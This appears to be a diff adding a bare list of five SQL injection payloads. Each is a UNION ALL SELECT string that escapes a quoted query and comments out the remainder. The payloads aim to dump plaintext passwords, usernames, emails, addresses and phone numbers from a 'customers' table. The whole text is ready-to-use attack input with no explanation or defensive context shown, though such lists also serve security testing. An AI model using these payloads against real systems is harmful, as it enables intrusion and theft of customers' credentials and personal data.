@@ -1,0 +1,5 @@
+' UNION ALL SELECT plainpassword, username, id, email, address, phone FROM customers --
+' UNION ALL SELECT id, username, plainpassword, password, email, address, instructions, phone, numberordered FROM customers #
+' UNION ALL SELECT username FROM customers #
+' UNION ALL SELECT id FROM customers #
+' UNION ALL SELECT plainpassword FROM customers #
